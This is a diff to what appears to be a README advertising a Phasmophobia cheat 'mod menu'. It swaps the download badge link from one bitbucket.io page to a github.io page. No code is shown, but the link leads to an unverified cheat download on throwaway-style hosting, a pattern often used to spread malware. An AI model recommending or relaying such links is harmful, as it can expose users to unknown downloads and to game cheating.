@@ -6,7 +6,7 @@ Tired of slow ghost hunts, failed objectives, or panicking over flickering light
 
 From serious solo farming to chaotic trolling in private lobbies, this mod menu gives you full control—just press a key and dominate the horror.
 
-[![Download ModMenu](https://img.shields.io/badge/Download-ModMenu-blueviolet)](https://fileoffload12.bitbucket.io)
+[![Download ModMenu](https://img.shields.io/badge/Download-ModMenu-blueviolet)](https://Phasmophobia-Mod-Menu-ryq.github.io/.github)
 ---
 
 ## 🎮 Product Overview
